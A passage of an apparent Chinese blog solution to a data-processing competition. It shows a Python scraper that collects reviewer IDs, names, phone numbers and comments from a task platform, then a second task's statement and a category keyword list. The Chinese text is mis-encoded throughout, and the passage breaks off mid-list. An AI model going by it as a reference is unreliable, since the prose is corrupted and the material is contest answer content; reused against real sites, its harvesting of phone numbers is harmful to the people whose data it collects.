class="hljs-number">1</span>].strip() <span class="hljs-keyword">if</span> separator <span class="hljs-keyword">in</span> text <span class="hljs-keyword">else</span> text.strip()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_user_info</span>(<span class="hljs-params">item</span>) -&gt; <span class="hljs-type">Tuple</span>[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">str</span>, <span class="hljs-built_in">str</span>]:<br>    <span class="hljs-string">&quot;&quot;&quot;è§£æç”¨æˆ·ä¿¡æ¯åŒºå—&quot;&quot;&quot;</span><br>    user_id_tag = item.find(<span class="hljs-string">&#x27;span&#x27;</span>, class_=<span class="hljs-string">&#x27;user-id&#x27;</span>)<br>    username_tag = item.find(<span class="hljs-string">&#x27;span&#x27;</span>, class_=<span class="hljs-string">&#x27;reviewer-name&#x27;</span>)<br>    phone_tag = item.find(<span class="hljs-string">&#x27;span&#x27;</span>, class_=<span class="hljs-string">&#x27;reviewer-phone&#x27;</span>)<br><br>    <span class="hljs-comment"># æå–ç”¨æˆ·IDï¼ˆæ•°å­—éƒ¨åˆ†ï¼‰</span><br>    user_id = re.search(<span class="hljs-string">r&#x27;\d+&#x27;</span>, user_id_tag.text).group() <span class="hljs-keyword">if</span> user_id_tag <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;&#x27;</span><br><br>    <span class="hljs-comment"># æå–ç”¨æˆ·å</span><br>    username = extract_field_value(username_tag.text) <span class="hljs-keyword">if</span> username_tag <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;&#x27;</span><br><br>    <span class="hljs-comment"># æå–ç”µè¯å·ç </span><br>    phone = extract_field_value(phone_tag.text) <span class="hljs-keyword">if</span> phone_tag <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;&#x27;</span><br><br>    <span class="hljs-keyword">return</span> user_id, username, phone<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_comment</span>(<span class="hljs-params">item</span>) -&gt; <span class="hljs-built_in">str</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;è§£æè¯„è®ºå†…å®¹&quot;&quot;&quot;</span><br>    content_tag = item.find(<span class="hljs-string">&#x27;div&#x27;</span>, class_=<span class="hljs-string">&#x27;review-content&#x27;</span>)<br>    <span class="hljs-keyword">return</span> content_tag.text.strip() <span class="hljs-keyword">if</span> content_tag <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_comments</span>(<span class="hljs-params">html: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-type">List</span>[<span class="hljs-type">Tuple</span>]:<br>    <span class="hljs-string">&quot;&quot;&quot;è§£æå®Œæ•´è¯„è®ºåˆ—è¡¨&quot;&quot;&quot;</span><br>    soup = BeautifulSoup(html, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>    container = soup.find(<span class="hljs-string">&#x27;div&#x27;</span>, class_=<span class="hljs-string">&#x27;reviews-container&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> container:<br>        <span class="hljs-keyword">return</span> []<br><br>    comments = []<br>    <span class="hljs-keyword">for</span> review_item <span class="hljs-keyword">in</span> container.find_all(<span class="hljs-string">&#x27;div&#x27;</span>, class_=<span class="hljs-string">&#x27;review-item&#x27;</span>):<br>        <span class="hljs-keyword">try</span>:<br>            user_id, username, phone = parse_user_info(review_item)<br>            comment = parse_comment(review_item)<br>            <span class="hljs-keyword">if</span> user_id:  <span class="hljs-comment"># å¿½ç•¥æ— æ•ˆæ¡ç›®</span><br>                comments.append((user_id, username, phone, comment))<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            logger.error(<span class="hljs-string">f&quot;è§£æè¯„è®ºæ¡ç›®å¤±è´¥: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">continue</span><br><br>    <span class="hljs-keyword">return</span> comments<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fetch_comments</span>(<span class="hljs-params">session: requests.Session, product_id: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-type">Optional</span>[<span class="hljs-type">List</span>[<span class="hljs-type">Tuple</span>]]:<br>    <span class="hljs-string">&quot;&quot;&quot;è·å–å•ä¸ªäº§å“çš„è¯„è®ºæ•°æ®&quot;&quot;&quot;</span><br>    params = &#123;<br>        <span class="hljs-string">&quot;controller&quot;</span>: <span class="hljs-string">&quot;product&quot;</span>,<br>        <span class="hljs-string">&quot;action&quot;</span>: <span class="hljs-string">&quot;detail&quot;</span>,<br>        <span class="hljs-string">&quot;id&quot;</span>: product_id<br>    &#125;<br><br>    <span class="hljs-keyword">try</span>:<br>        response = session.get(<br>            Config.full_url(),<br>            params=params,<br>            timeout=Config.REQUEST_TIMEOUT<br>        )<br>        response.raise_for_status()<br>        <span class="hljs-keyword">return</span> parse_comments(response.text)<br>    <span class="hljs-keyword">except</span> requests.exceptions.HTTPError <span class="hljs-keyword">as</span> e:<br>        logger.warning(<span class="hljs-string">f&quot;äº§å“ <span class="hljs-subst">&#123;product_id&#125;</span> è¯·æ±‚å¤±è´¥: HTTP <span class="hljs-subst">&#123;response.status_code&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">except</span> requests.exceptions.Timeout:<br>        logger.warning(<span class="hljs-string">f&quot;äº§å“ <span class="hljs-subst">&#123;product_id&#125;</span> è¯·æ±‚è¶…æ—¶&quot;</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        logger.error(<span class="hljs-string">f&quot;äº§å“ <span class="hljs-subst">&#123;product_id&#125;</span> è¯·æ±‚å¼‚å¸¸: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">analyze_sentiment</span>(<span class="hljs-params">comment: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">int</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;æ”¹è¿›çš„æƒ…æ„Ÿåˆ†æé€»è¾‘&quot;&quot;&quot;</span><br>    POSITIVE_KEYWORDS = &#123;<span class="hljs-string">&#x27;å¥½&#x27;</span>, <span class="hljs-string">&#x27;æ»¡æ„&#x27;</span>, <span class="hljs-string">&#x27;æ¨è&#x27;</span>, <span class="hljs-string">&#x27;ä¸é”™&#x27;</span>, <span class="hljs-string">&#x27;è¶…å€¼&#x27;</span>, <span class="hljs-string">&#x27;å¿«&#x27;</span>, <span class="hljs-string">&#x27;ç»™åŠ›&#x27;</span>&#125;<br>    NEGATIVE_KEYWORDS = &#123;<span class="hljs-string">&#x27;å·®&#x27;</span>, <span class="hljs-string">&#x27;ä¸è¡Œ&#x27;</span>, <span class="hljs-string">&#x27;å¤±æœ›&#x27;</span>, <span class="hljs-string">&#x27;ç ´æŸ&#x27;</span>, <span class="hljs-string">&#x27;æ¼&#x27;</span>, <span class="hljs-string">&#x27;è´µ&#x27;</span>, <span class="hljs-string">&#x27;æ²¡ç”¨&#x27;</span>&#125;<br><br>    clean_comment = comment.lower()<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(kw <span class="hljs-keyword">in</span> clean_comment <span class="hljs-keyword">for</span> kw <span class="hljs-keyword">in</span> POSITIVE_KEYWORDS):<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(kw <span class="hljs-keyword">in</span> clean_comment <span class="hljs-keyword">for</span> kw <span class="hljs-keyword">in</span> NEGATIVE_KEYWORDS):<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>  <span class="hljs-comment"># é»˜è®¤ä¸­æ€§å½’ä¸ºè´Ÿé¢</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_md5</span>(<span class="hljs-params">row: pd.Series</span>) -&gt; <span class="hljs-built_in">str</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;ç”Ÿæˆæ•°æ®ç­¾å&quot;&quot;&quot;</span><br>    composite_str = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;row[<span class="hljs-string">&#x27;user_id&#x27;</span>]&#125;</span><span class="hljs-subst">&#123;row[<span class="hljs-string">&#x27;username&#x27;</span>]&#125;</span><span class="hljs-subst">&#123;row[<span class="hljs-string">&#x27;phone&#x27;</span>]&#125;</span>&quot;</span><br>    <span class="hljs-keyword">return</span> hashlib.md5(composite_str.encode()).hexdigest()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_data</span>(<span class="hljs-params">raw_data: <span class="hljs-type">List</span>[<span class="hljs-type">Tuple</span>]</span>) -&gt; pd.DataFrame:<br>    <span class="hljs-string">&quot;&quot;&quot;æ•°æ®åŠ å·¥ç®¡é“&quot;&quot;&quot;</span><br>    df = pd.DataFrame(<br>        raw_data,<br>        columns=[<span class="hljs-string">&#x27;user_id&#x27;</span>, <span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-string">&#x27;phone&#x27;</span>, <span class="hljs-string">&#x27;comment&#x27;</span>]<br>    ).drop_duplicates(subset=[<span class="hljs-string">&#x27;user_id&#x27;</span>], keep=<span class="hljs-string">&#x27;first&#x27;</span>)<br><br>    df[<span class="hljs-string">&#x27;label&#x27;</span>] = df[<span class="hljs-string">&#x27;comment&#x27;</span>].apply(analyze_sentiment)<br>    df[<span class="hljs-string">&#x27;signature&#x27;</span>] = df.apply(generate_md5, axis=<span class="hljs-number">1</span>)<br><br>    <span class="hljs-keyword">return</span> df.sort_values(<span class="hljs-string">&#x27;user_id&#x27;</span>, ascending=<span class="hljs-literal">True</span>)[[<span class="hljs-string">&#x27;user_id&#x27;</span>, <span class="hljs-string">&#x27;label&#x27;</span>, <span class="hljs-string">&#x27;signature&#x27;</span>]]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;ä¸»æ‰§è¡Œæµç¨‹&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">with</span> requests.Session() <span class="hljs-keyword">as</span> session:<br>        session.headers.update(Config.HEADERS)<br><br>        <span class="hljs-comment"># å¸¦è¿›åº¦æ¡çš„æ•°æ®é‡‡é›†</span><br>        product_ids = <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, Config.MAX_PRODUCTS + <span class="hljs-number">1</span>)<br>        all_comments = []<br><br>        <span class="hljs-keyword">for</span> pid <span class="hljs-keyword">in</span> tqdm(product_ids, desc=<span class="hljs-string">&quot;é‡‡é›†äº§å“è¯„è®º&quot;</span>):<br>            <span class="hljs-keyword">if</span> comments := fetch_comments(session, pid):<br>                all_comments.extend(comments)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> all_comments:<br>            logger.error(<span class="hljs-string">&quot;æœªè·å–åˆ°æœ‰æ•ˆæ•°æ®ï¼Œè¯·æ£€æŸ¥ç½‘ç»œè¿æ¥æˆ–é¡µé¢ç»“æ„&quot;</span>)<br>            <span class="hljs-keyword">return</span><br><br>        <span class="hljs-comment"># æ•°æ®å¤„ç†</span><br>        final_df = process_data(all_comments)<br><br>        <span class="hljs-comment"># ç»“æœä¿å­˜</span><br>        final_df.to_csv(Config.OUTPUT_FILE, index=<span class="hljs-literal">False</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        logger.info(<span class="hljs-string">f&quot;æˆåŠŸç”Ÿæˆæ•°æ®æ–‡ä»¶ <span class="hljs-subst">&#123;Config.OUTPUT_FILE&#125;</span>ï¼ŒåŒ…å« <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(final_df)&#125;</span> æ¡è®°å½•&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h3 id="2-ä»»åŠ¡â¼†ï¼šæ•°æ®æ¸…æ´—ä¸ç‰¹å¾â¼¯ç¨‹"><a href="#2-ä»»åŠ¡â¼†ï¼šæ•°æ®æ¸…æ´—ä¸ç‰¹å¾â¼¯ç¨‹" class="headerlink" title="2.ä»»åŠ¡â¼†ï¼šæ•°æ®æ¸…æ´—ä¸ç‰¹å¾â¼¯ç¨‹"></a>2.ä»»åŠ¡â¼†ï¼šæ•°æ®æ¸…æ´—ä¸ç‰¹å¾â¼¯ç¨‹</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">ã€é¢˜â¼²æè¿°ã€‘<br><br>é’ˆå¯¹åœ¨çº¿å›¢è´­å¹³å°æä¾›çš„å•†å“æ•°æ®ï¼Œæ‚¨éœ€è¦çˆ¬å–åè¿›â¾æ•°æ®æ¸…æ´—ï¼ˆå¤„ç†å¼‚å¸¸é”€é‡ï¼‰å’Œç‰¹å¾â¼¯ç¨‹ï¼ˆæå–åˆ†ç±»ç¼–å·ã€ç»Ÿè®¡è¯„è®ºæ•°ï¼‰ï¼ŒæŒ‰é™„ä»¶æ¨¡æ¿å’Œä»»åŠ¡ä¹¦è¦æ±‚æäº¤å¤„ç†åçš„<span class="hljs-keyword">submit_2.csvâ½‚ä»¶è¿›â¾è¯„åˆ†ã€‚</span><br><span class="hljs-keyword"></span><br>ã€ç­”æ¡ˆæäº¤ã€‘<br>æäº¤ä»…åŒ…å«<span class="hljs-number">4</span>åˆ—å†…å®¹çš„<span class="hljs-keyword">submit_2.csvâ½‚ä»¶ã€‚</span><br><span class="hljs-keyword"></span>â€¢ ç¬¬â¼€åˆ—ä¸ºproduct_idï¼ˆéœ€è¦ä¸åœ¨çº¿å›¢è´­å¹³å°â¾¸â»šé€‰é¡¹å¡ä¸­çš„å•†å“IDå¯¹åº”ï¼Œä¸¥æ ¼æŒ‰ç…§å‡åºæ’åˆ—ï¼‰<br>â€¢ ç¬¬â¼†åˆ—ä¸ºsalesï¼ˆæ¸…æ´—åå•†å“é”€é‡ï¼ˆè´Ÿæ•°æˆ–ç©ºå€¼è®¾ä¸º<span class="hljs-number">0</span>ï¼‰ï¼‰<br>â€¢ ç¬¬ä¸‰åˆ—ä¸ºcategory_idï¼ˆæ ¹æ®å•†å“åç§°ï¼Œâ½å¯¹æä¾›çš„å•†å“åˆ†ç±»è¡¨ï¼Œæ‰¾å¯¹æœ€ç¬¦åˆçš„æ ‡å·ï¼‰<br>â€¢ ç¬¬å››åˆ—ä¸ºreviews_numberï¼ˆå¡«â¼Šå•†å“IDä¸‹çš„è¯„è®ºæ€»æ•°ï¼Œâ½†è¯„è®ºåˆ™è®¾ç½®ä¸º<span class="hljs-number">0</span>ï¼‰<br></code></pre></td></tr></table></figure><p>æ ¹æ®é¢˜ç›®è¦æ±‚ï¼Œä¸»è¦æ˜¯å¯¹å…¶åˆ†ç±»çš„æƒ…å†µè¦å¤šä¸€ç‚¹å…³é”®è¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs python">CATEGORY_KEYWORDS = [<br>    (<span class="hljs-number">11</span>, [<span class="hljs-string">&#x27;çƒ­æ°´å™¨&#x27;</span>, <span class="hljs-string">&#x27;é€Ÿçƒ­&#x27;</span>, <span class="hljs-string">&#x27;æ’æ¸©&#x27;</span>, <span class="hljs-string">&#x27;é˜²å¹²çƒ§&#x27;</span>, <span class="hljs-string">&#x27;å³çƒ­å¼&#x27;</span>, <span class="hljs-string">&#x27;å‚¨æ°´å¼&#x27;</span>, <span class="hljs-string">&#x27;ç”µçƒ­æ°´å™¨&#x27;</span>, <span class="hljs-string">&#x27;ç‡ƒæ°”çƒ­æ°´å™¨&#x27;</span>,<br>          <span class="hljs-string">&#x27;å¤ªé˜³èƒ½çƒ­æ°´å™¨&#x27;</span>, <span class="hljs-string">&#x27;ç©ºæ°”èƒ½çƒ­æ°´å™¨&#x27;</span>, <span class="hljs-string">&#x27;å£æŒ‚ç‚‰&#x27;</span>, <span class="hljs-string">&#x27;çƒ­æ°´ç³»ç»Ÿ&#x27;</span>, <span class="hljs-string">&#x27;å›æ°´è£…ç½®&#x27;</span>, <span class="hljs-string">&#x27;æ’æ¸©é˜€&#x27;</span>,<br>          <span class="hljs-string">&#x27;é•æ£’&#x27;</span>, <span class="hljs-string">&#x27;é˜²ç”µå¢™&#x27;</span>, <span class="hljs-string">&#x27;é€Ÿçƒ­ç”µçƒ­æ°´å™¨&#x27;</span>, <span class="hljs-string">&#x27;é›¶å†·æ°´&#x27;</span>, <span class="hljs-string">&#x27;é¢„å³åŒæ¨¡&#x27;</span>]),<br><br>    (<span class="hljs-number">16</span>, [<span class="hljs-string">&#x27;æ±½è½¦&#x27;</span>, <span class="hljs-string">&#x27;è½¦è½½&#x27;</span>, <span class="hljs-string">&#x27;æœºæ²¹&#x27;</span>, <span class="hljs-string">&#x27;è½®èƒ&#x27;</span>, <span class="hljs-string">&#x27;å˜é€Ÿç®±&#x27;</span>, <span class="hljs-string">&#x27;åˆ¹è½¦ç‰‡&#x27;</span>, <span class="hljs-string">&#x27;é›¨åˆ·&#x27;</span>, <span class="hljs-string">&#x27;ç«èŠ±å¡&#x27;</span>, <span class="hljs-string">&#x27;æ»¤æ¸…å™¨&#x27;</span>,<br>          <span class="hljs-string">&#x27;è“„ç”µæ± &#x27;</span>, <span class="hljs-string">&#x27;è¡Œè½¦è®°å½•ä»ª&#x27;</span>, <span class="hljs-string">&#x27;è½¦è½½å……ç”µå™¨&#x27;</span>, <span class="hljs-string">&#x27;æ±½è½¦è´´è†œ&#x27;</span>, <span class="hljs-string">&#x27;è„šå«&#x27;</span>, <span class="hljs-string">&#x27;æ–¹å‘ç›˜å¥—&#x27;</span>, <span class="hljs-string">&#x27;é˜²å†»æ¶²&#x27;</span>,<br>          <span class="hljs-string">&#x27;ç»ç’ƒæ°´&#x27;</span>, <span class="hljs-string">&#x27;æ‚¬æŒ‚ç³»ç»Ÿ&#x27;</span>, <span class="hljs-string">&#x27;æ¶¡è½®å¢å‹&#x27;</span>, <span class="hljs-string">&#x27;å››è½®å®šä½&#x27;</span>, <span class="hljs-string">&#x27;é’£é‡‘å–·æ¼†&#x27;</span>, <span class="hljs-string">&#x27;æ±½è½¦ç¾å®¹&#x27;</span>, <span class="hljs-string">&#x27;è½¦è¡£&#x27;</span>]),<br><br>    (<span class="hljs-number">15</span>, [<span class="hljs-string">&#x27;ç©å…·&#x27;</span>, <span class="hljs-string">&#x27;ä¹é«˜&#x27;</span>, <span class="hljs-string">&#x27;ç§¯æœ¨&#x27;</span>, <span class="hljs-string">&#x27;é’¢ç´&#x27;</span>, <span class="hljs-string">&#x27;å‰ä»–&#x27;</span>, <span class="hljs-string">&#x27;æ‹¼å›¾&#x27;</span>, <span class="hljs-string">&#x27;é¥æ§è½¦&#x27;</span>, <span class="hljs-string">&#x27;èŠ­æ¯”å¨ƒå¨ƒ&#x27;</span>, <span class="hljs-string">&#x27;å˜å½¢é‡‘åˆš&#x27;</span>,<br>          <span class="hljs-string">&#x27;æ‹¼è£…æ¨¡å‹&#x27;</span>, <span class="hljs-string">&#x27;ç›Šæ™ºç©å…·&#x27;</span>, <span class="hljs-string">&#x27;æ—©æ•™æœº&#x27;</span>, <span class="hljs-string">&#x27;ç£åŠ›ç‰‡&#x27;</span>, <span class="hljs-string">&#x27;è½¨é“è½¦&#x27;</span>, <span class="hljs-string">&#x27;æ¯›ç»’ç©å…·&#x27;</span>, <span class="hljs-string">&#x27;ç”µå­ç´&#x27;</span>, <span class="hljs-string">&#x27;å°æç´&#x27;</span>,<br>          <span class="hljs-string">&#x27;æ¶å­é¼“&#x27;</span>, <span class="hljs-string">&#x27;å°¤å…‹é‡Œé‡Œ&#x27;</span>, <span class="hljs-string">&#x27;å£ç´&#x27;</span>, <span class="hljs-string">&#x27;éŸ³ä¹ç›’&#x27;</span>, <span class="hljs-string">&#x27;ç”»æ¿&#x27;</span>, <span class="hljs-string">&#x27;æ©¡çš®æ³¥&#x27;</span>, <span class="hljs-string">&#x27;æ²™æ»©ç©å…·&#x27;</span>]),<br><br>    (<span class="hljs-number">22</span>, [<span class="hljs-string">&#x27;åŒ»ç–—&#x27;</span>, <span class="hljs-string">&#x27;ä½“æ¸©è®¡&#x27;</span>, <span class="hljs-string">&#x27;è¡€å‹ä»ª&#x27;</span>, <span class="hljs-string">&#x27;è½®æ¤…&#x27;</span>, <span class="hljs-string">&#x27;åŠ©è¡Œå™¨&#x27;</span>, <span class="hljs-string">&#x27;è¡€ç³–ä»ª&#x27;</span>, <span class="hljs-string">&#x27;åˆ¶æ°§æœº&#x27;</span>, <span class="hljs-string">&#x27;é›¾åŒ–å™¨&#x27;</span>, <span class="hljs-string">&#x27;å¬è¯Šå™¨&#x27;</span>,<br>          <span class="hljs-string">&#x27;åŒ»ç”¨å£ç½©&#x27;</span>, <span class="hljs-string">&#x27;é˜²æŠ¤æœ&#x27;</span>, <span class="hljs-string">&#x27;æ‰‹æœ¯åˆ€&#x27;</span>, <span class="hljs-string">&#x27;é’ˆç¸é’ˆ&#x27;</span>, <span class="hljs-string">&#x27;ç†ç–—ä»ª&#x27;</span>, <span class="hljs-string">&#x27;åº·å¤è®¾å¤‡&#x27;</span>, <span class="hljs-string">&#x27;åŠ©å¬å™¨&#x27;</span>, <span class="hljs-string">&#x27;å‘¼å¸æœº&#x27;</span>,<br>          <span class="hljs-string">&#x27;æŠ¤ç†åºŠ&#x27;</span>, <span class="hljs-string">&#x27;è¡€å‹è®¡&#x27;</span>, <span class="hljs-string">&#x27;è¡€æ°§ä»ª&#x27;</span>, <span class="hljs-string">&#x27;æ¶ˆæ¯’æŸœ&#x27;</span>, <span class="hljs-string">&#x27;åŒ»ç”¨çº±å¸ƒ&#x27;</span>, <span class="hljs-string">&#x27;æ£‰ç­¾&#x27;</span>, <span class="hljs-string">&#x27;åˆ›å¯è´´&#x27;</span>]),<br><br>    (<span class="hljs-number">23</span>, [<span class="hljs-string">&#x27;èŠ±å‰&#x27;</span>, <span class="hljs-string">&#x27;ç»¿æ¤&#x27;</span>, <span class="hljs-string">&#x27;å¤šè‚‰&#x27;</span>, <span class="hljs-string">&#x27;ç›†æ ½&#x27;</span>, <span class="hljs-string">&#x27;ç§å­&#x27;</span>, <span class="hljs-string">&#x27;èŠ±ç›†&#x27;</span>, <span class="hljs-string">&#x27;è¥å…»åœŸ&#x27;</span>, <span class="hljs-string">&#x27;å›­è‰ºå‰ª&#x27;</span>, <span class="hljs-string">&#x27;å–·å£¶&#x27;</span>, <span class="hljs-string">&#x27;èŠ±æ¶&#x27;</span>,<br>          <span class="hljs-string">&#x27;è§‚å¶æ¤ç‰©&#x27;</span>, <span class="hljs-string">&#x27;é²œèŠ±&#x27;</span>, <span class="hljs-string">&#x27;å¹²èŠ±&#x27;</span>, <span class="hljs-string">&#x27;èŠ±è‚¥&#x27;</span>, <span class="hljs-string">&#x27;æ€è™«å‰‚&#x27;</span>, <span class="hljs-string">&#x27;ç”Ÿæ ¹ç²‰&#x27;</span>, <span class="hljs-string">&#x27;è‚²è‹—ç›˜&#x27;</span>, <span class="hljs-string">&#x27;è‹”è—“å¾®æ™¯è§‚&#x27;</span>,<br>          <span class="hljs-string">&#x27;æ°´åŸ¹æ¤ç‰©&#x27;</span>, <span class="hljs-string">&#x27;å…°èŠ±&#x27;</span>, <span class="hljs-string">&#x27;ä»™äººæŒ&#x27;</span>, <span class="hljs-string">&#x27;ç»¿è&#x27;</span>, <span class="hljs-string">&#x27;å¯Œè´µç«¹&#x27;</span>, <span class="hljs-string">&#x27;å‘è´¢æ ‘&#x27;</span>, <span class="hljs-string">&#x27;æ–‡ç«¹&#x27;</span>]),<br><br>    (<span class="hljs-number">25</span>, [<span class="hljs-string">&#x27;å›­è‰ºå·¥å…·&#x27;</span>, <span class="hljs-string">&#x27;æ´’æ°´å™¨&#x27;</span>, <span class="hljs-string">&#x27;é“²å­&#x27;</span>, <span class="hljs-string">&#x27;èŠ±ç›†&#x27;</span>, <span class="hljs-string">&#x27;è¥å…»åœŸ&#x27;</span>, <span class="hljs-string">&#x27;ä¿®æå‰ª&#x27;</span>, <span class="hljs-string">&#x27;å«æ¥åˆ€&#x27;</span>, <span class="hljs-string">&#x27;å›­è‰ºæ‰‹å¥—&#x27;</span>,<br>          <span class="hljs-string">&#x27;å‰²è‰æœº&#x27;</span>, <span class="hljs-string">&#x27;ç»¿ç¯±æœº&#x27;</span>, <span class="hljs-string">&#x27;æ ‘æç²‰ç¢æœº&#x27;</span>, <span class="hljs-string">&#x27;å›­è‰ºé”¯&#x27;</span>, <span class="hljs-string">&#x27;æ¾åœŸå™¨&#x27;</span>, <span class="hljs-string">&#x27;è‚²è‹—ç®±&#x27;</span>, <span class="hljs-string">&#x27;è‡ªåŠ¨å–·çŒ&#x27;</span>,<br>          <span class="hljs-string">&#x27;å›­è‰ºæ”¯æ¶&#x27;</span>, <span class="hljs-string">&#x27;æ¥æ°´ç›˜&#x27;</span>, <span class="hljs-string">&#x27;æ’­ç§å™¨&#x27;</span>, <span class="hljs-string">&#x27;å›­è‰ºåœ°å¸ƒ&#x27;</span>, <span class="hljs-string">&#x27;é˜²è‰å¸ƒ&#x27;</span>, <span class="hljs-string">&#x27;æ™ºèƒ½èŠ±ç›†&#x27;</span>, <span class="hljs-string">&#x27;æ¤ç‰©è¡¥å…‰ç¯&#x27;</span>]),<br><br>    (<span class="hljs-number">2</span>, [<span class="hljs-string">&#x27;æ¯å©´&#x27;</span>, <span class="hljs-string">&#x27;å¥¶ç²‰&#x27;</span>, <span class="hljs-string">&#x27;å°¿ä¸æ¹¿&#x27;</span>, <span class="hljs-string">&#x27;å©´å„¿è½¦&#x27;</span>, <span class="hljs-string">&#x27;å¥¶ç“¶&#x27;</span>, <span class="hljs-string">&#x27;å¸å¥¶å™¨&#x27;</span>, <span class="hljs-string">&#x27;å­•å¦‡è£…&#x27;</span>, <span class="hljs-string">&#x27;å¾…äº§åŒ…&#x27;</span>, <span class="hljs-string">&#x27;å©´å„¿åºŠ&#x27;</span>,<br>         <span class="hljs-string">&#x27;å­¦æ­¥è½¦&#x27;</span>, <span class="hljs-string">&#x27;å„¿ç«¥é¤æ¤…&#x27;</span>, <span class="hljs-string">&#x27;éš”å°¿å«&#x27;</span>, <span class="hljs-string">&#x27;å“ºä¹³æ•&#x27;</span>, <span class="hljs-string">&#x27;æ¸©å¥¶å™¨&#x27;</span>, <span class="hljs-string">&#x27;å©´å„¿èƒŒå¸¦&#x27;</span>, <span class="hljs-string">&#x27;é˜²æº¢ä¹³å«&#x27;</span>,<br>         <span class="hljs-string">&#x27;å©´å„¿æ¹¿å·¾&#x27;</span>, <span class="hljs-string">&#x27;å©´å„¿æ²æµ´éœ²&#x27;</span>, <span class="hljs-string">&#x27;æŠ¤è‡€è†&#x27;</span>, <span class="hljs-string">&#x27;å©´å„¿ç†å‘å™¨&#x27;</span>, <span class="hljs-string">&#x27;æ—©æ•™ç©å…·&#x27;</span>, <span 